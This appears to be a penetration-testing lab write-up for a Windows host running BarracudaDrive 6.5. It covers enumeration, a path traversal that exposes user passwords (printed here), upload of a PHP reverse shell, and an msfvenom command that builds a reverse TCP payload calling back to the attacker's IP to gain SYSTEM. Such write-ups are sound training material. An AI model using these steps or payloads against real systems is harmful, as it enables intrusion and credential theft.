#Pwned! 
```IP
192.168.150.127
```
# Enumeration

## FTP 30021
FileZilla ftpd 0.9.41 beta
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241211092557.png?raw=true)

## HTTP 8000
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241211090801.png?raw=true)
BarracudaDrive 6.5
PE https://www.exploit-db.com/exploits/48789
fuzzing different extensions to upload a file
```
ffuf -request files/ext.req -request-proto http -w /usr/share/SecLists-master/Fuzzing/extensions-Bo0oM.txt
```
none works

## HTTP 33033
we can update passwords
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241211094745.png?raw=true)
and we can path traversal to other users and see their passwords
```
4qpdR87QYjRbog
xuk1EuP3N/rCpA
AJqKXnKVwhcSkg
WgsjOZwtOyCRSg
```

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241211095528.png?raw=true)
# Exploitation

it is possible to navigate through directories in HTTP 8000. I got stuck a lot of time because I couldnt click on C, so it didn't seem like a directory....
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241211105130.png?raw=true)
Once a revshell has been uploaded to the latter directory, you can access it via  
```
http://192.168.150.127:45332/shell2.php
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241211105019.png?raw=true)
and type the local flag
# PrivEsc

## Manual
lets try the PE vulnerability found in BarracudaDrive 6.5
https://www.exploit-db.com/exploits/48789

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241211105508.png?raw=true)
create a malicious revshell. substitute bd.exe and restart the computer
```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.189 LPORT=4444 -f exe > reverse.exe
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241211110042.png?raw=true)
we are nt authority system
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241211110129.png?raw=true)
## Automated

### Peass
### Mimikatz

# Lateral Movement

